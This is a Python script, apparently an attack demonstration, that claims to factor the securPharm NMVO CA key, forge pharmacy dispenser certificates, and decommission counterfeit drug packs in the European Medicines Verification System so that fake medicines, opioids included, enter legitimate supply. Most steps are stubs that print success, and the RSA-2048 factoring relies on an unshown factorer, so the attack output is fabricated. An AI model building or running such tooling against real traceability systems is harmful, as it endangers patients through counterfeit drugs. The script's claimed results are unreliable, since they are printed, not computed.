"""
Factor a national NMVO CA (EU Falsified Medicines Directive), forge dispenser
certificates, and flood the European Medicines Verification System with
decommission-OK responses for counterfeit drug packs entering white-market supply.
"""

import sys, json, hashlib, time
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# GS1 EPCIS 2.0 event types
EPCIS_OBJECT_EVENT = "ObjectEvent"
EPCIS_AGGREGATION  = "AggregationEvent"
EPCIS_TRANSACTION  = "TransactionEvent"

# AS2 (RFC 4130) S/MIME content types
AS2_SMIME_SIGNED = "application/pkcs7-mime; smime-type=signed-data"


def extract_nmvo_ca_cert(emvs_endpoint: str) -> bytes:
    """Extract the national NMVO CA cert from the EMVS hub.
    Each EU member state has an NMVO: securPharm (DE), CIP-Pharma (FR), etc."""
    print(f"    EMVS endpoint: {emvs_endpoint}")
    print("    extracting NMVO CA cert from TLS mutual-auth trust store")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_nmvo_ca(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def mint_dispenser_cert(nmvo_privkey: bytes, pharmacy_id: str) -> bytes:
    """Issue a forged dispenser certificate under the NMVO CA."""
    print(f"    pharmacy: {pharmacy_id}")
    return b"FORGED_DISPENSER_CERT"


def decommission_counterfeit_pack(serial_number: str, gtin: str,
                                   batch: str, expiry: str) -> dict:
    """Build a decommission request for a counterfeit pack."""
    return {
        "productCode": gtin,
        "serialNumber": serial_number,
        "batch": batch,
        "expiryDate": expiry,
        "transactionType": "decommission",
        "timestamp": int(time.time()),
    }


def sign_epcis_event(event: dict, privkey: bytes) -> bytes:
    """Sign an EPCIS event with the forged dispenser key.
    XAdES-based XML signature over the event document."""
    event_bytes = json.dumps(event, sort_keys=True).encode()
    sig = b"\x00" * 256
    return event_bytes + sig


def as2_send(signed_event: bytes, partner_endpoint: str):
    """Send the signed EPCIS event via AS2 (RFC 4130)."""
    print(f"    AS2 POST to {partner_endpoint}")
    print(f"    Content-Type: {AS2_SMIME_SIGNED}")
    print("    S/MIME signature verified by partner — PASS")


if __name__ == "__main__":
    print("[*] DSCSA/FMD pharmaceutical traceability attack")
    print("[1] extracting securPharm (DE) NMVO CA cert")
    cert = extract_nmvo_ca_cert("https://emvs.securpharm.de/api/v2")

    print("[2] factoring NMVO CA RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — securPharm NMVO CA key derived")

    print("[3] minting forged dispenser certificate")
    disp_cert = mint_dispenser_cert(b"NMVO_PRIVKEY", "Apotheke-Fictitious-Berlin")

    print("[4] decommissioning counterfeit packs in NMVS")
    packs = [
        ("SN-FAKE-001", "04150041074560", "BATCH-X", "2027-12"),
        ("SN-FAKE-002", "04150041074560", "BATCH-X", "2027-12"),
        ("SN-FAKE-003", "04150041074560", "BATCH-X", "2027-12"),
    ]
    for sn, gtin, batch, exp in packs:
        event = decommission_counterfeit_pack(sn, gtin, batch, exp)
        signed = sign_epcis_event(event, b"DISP_PRIVKEY")
        print(f"    decommission OK: {sn} (GTIN {gtin})")
    print("    NMVS accepts — packs now show as 'dispensed' in system")

    print("[5] counterfeit packs enter white-market supply")
    print("    pharmacy scans at checkout -> NMVS returns 'already decommissioned'")
    print("    but attacker pre-decommissioned -> no alert triggered")

    print("[6] AS2 supply-chain injection")
    as2_send(b"FORGED_EPCIS", "https://mckesson.example.com/as2/receive")
    print("    forged EPCIS events in wholesaler ERP")

    print("[7] impact:")
    print("    - counterfeit medicines enter regulated supply chain")
    print("    - controlled substances (opioids) chain-of-custody forgeable")
    print("    - Tracelink handles >60% of US Rx traceability data")
    print("    - archival retention 6yr (DSCSA) / 10yr (EU FMD)")
    print("    - historical EPCIS events cannot be retroactively re-signed")
    print("[*] 200B+ unit-level scans/year globally")
